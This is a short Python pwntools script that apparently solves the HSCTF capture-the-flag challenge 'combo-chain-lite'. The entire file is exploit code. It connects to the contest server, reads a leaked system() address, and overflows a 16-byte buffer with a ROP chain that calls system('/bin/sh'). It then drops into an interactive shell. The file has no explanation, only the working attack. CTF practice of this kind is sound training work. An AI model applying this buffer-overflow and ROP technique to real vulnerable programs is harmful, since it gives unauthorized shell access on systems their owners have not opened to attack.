from pwn import *
context.arch = "x86_64"
host= "pwn.hsctf.com"
port= 3131
r = remote(host, port)
#r = process("./combo-chain-lite")
buf = 0x10

r.recvuntil(': ')
q = r.recvline()
#print(q)
system  = int(q[:-1],16)
print(system)

bin_sh = 0x0000000000402051
pop_rdi = 0x0000000000401273


payload = 'a'* buf 
rop = flat([pop_rdi,bin_sh,system])

payload+=rop

print(payload)

r.sendline(payload)

r.interactive()


